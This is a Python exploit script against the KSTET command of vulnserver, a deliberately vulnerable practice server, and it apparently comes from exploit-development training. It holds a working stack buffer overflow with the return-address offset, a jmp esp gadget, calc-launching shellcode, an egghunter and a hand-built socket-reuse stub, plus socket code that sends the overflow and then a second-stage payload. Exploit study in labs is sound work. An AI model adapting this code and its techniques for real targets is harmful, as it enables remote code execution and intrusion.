#!/usr/bin/python -w

# KSTET exploit. different payloads for basic return address overwrite
# egghunter and socket reuse 

import socket
import os
import sys
import struct

from time import sleep
host="192.168.85.133"
port=9999



# eip offset = 70
# esp offset = 74
# jmp esp taken from essfunc.dll in vulnserver
jmp_esp = 0x625011af
jmp_esp = struct.pack('i', jmp_esp)

# payload len 16 
# spawn calc
payload = "\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0" 

# sub esp,byte +0x48,
jmp_payload = "\x83\xec\x48\x90\xff\xe4\x90\x90"

#egghunter/length 32 
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


# overwrite return address
#buffer = "KSTET " + "A"*70 + "\xaf\x11\x50\x62" + payload + "C"*(5000-80) 

# with jmp to beginning of exploit
# buffer = "KSTET " + "A"*2 + payload + "A"*52 + "\xaf\x11\x50\x62" + jmp_payload + "C"*(5000-82)

# egghunter
#buffer = "KSTET " + "A"*2 + egghunter + "A"*36 + "\xaf\x11\x50\x62" + jmp_payload + "C"*1000 

# recv() socket reuse @ 0x00401953
# socket @ ebp - 400 aka esp + 5a8 / adjusted for moving esp - 0x48 = esp + 0x1d0 
# buffer pointer @esp+40 
# length = 400
# flags = 0
# socket_reuse = "\x90"*4
socket_reuse = "\x83\xc4\x40"       #add esp, 0x40   ; move somewhere safe to put parameters
socket_reuse += "\x83\xc4\x40"       #add esp, 0x40   ; move somewhere safe to put parameters
socket_reuse += "\x83\xc4\x40"       #add esp, 0x40   ; move somewhere safe to put parameters
socket_reuse += "\x83\xc4\x40"       #add esp, 0x40   ; move somewhere safe to put parameters
socket_reuse += "\x31\xc0"          # xor eax, eax    ; prepare 0 for flags
socket_reuse += "\x50"              # push eax      ; flags = 0
socket_reuse += "\x66\xb8\x90\x01"  # mov ax, 0x190 ; buffer size of 400
socket_reuse += "\x50"              # push eax
socket_reuse += "\x89\xE0"          # mov eax, esp    ; buffer pointer will be esp+20
socket_reuse += "\x2c\x08"     # "\x04\x20"          # add al, 0x20
socket_reuse += "\x50"              # push eax
socket_reuse += "\x89\xc3"              # mov ebx, eax, to jump to after buffer is filled

socket_reuse += "\x89\xe0"            # mov eax, esp 
socket_reuse += "\x66\x83\xC0\x70"          # add ax, 0x68
socket_reuse += "\x66\x83\xC0\x6c"          # add ax, 0x68

socket_reuse += "\xff\x30"              # push [eax]
socket_reuse += "\x31\xc0"          # xor eax, eax
socket_reuse += "\x66\xB8\x25\x40"   # mov ax,0x4025  0x0040252C
socket_reuse += "\xC1\xE0\x08"      # shl eax, 0x8
socket_reuse += "\x04\x2c"      # add al,0x2c
socket_reuse += "\xff\xd0"          # call eax
socket_reuse += "\xcc"
socket_reuse += "\xff\xe4"          # jmp to ebx


buffer = "KSTET " + "AA" + socket_reuse +   "A"*(68- len(socket_reuse))     + "\xaf\x11\x50\x62" + jmp_payload + "C"*100




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
print("[*] Connecting to server. Server says:")
print(sock.recv(1024))

# loading egg
# sock.send("KSTET " + "w00t"*2 + payload)

print("[*] Sending buffer to server")
sock.send(buffer)

#print("[*] Server replies with:")

sleep(5)
print("[*] Sending shellcode now")
sock.send("\x90"*400 + payload)
#print(sock.recv(1024))
sock.close()

